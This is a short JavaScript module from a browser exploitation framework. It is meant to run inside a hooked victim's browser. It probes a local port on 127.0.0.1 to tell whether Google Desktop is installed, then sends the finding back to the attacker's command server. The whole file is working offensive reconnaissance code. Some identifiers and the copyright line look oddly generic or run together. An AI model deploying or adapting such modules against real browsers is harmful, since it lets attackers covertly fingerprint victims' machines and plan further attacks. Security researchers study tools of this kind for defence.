//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var dom = document.createElement('b');
	var img = new Image;
	img.src = "http://127.0.0.1:4664/logo3.gif";
	img.onload = function() { server.net.send('<%= @command_url %>', <%= @command_id %>,'google_desktop=Installed', server.are.status_success());dom.removeChild(this); }
	img.onerror = function() { server.net.send('<%= @command_url %>', <%= @command_id %>,'google_desktop=Not Installed', server.are.status_error());dom.removeChild(this); }
	dom.appendChild(img);

});

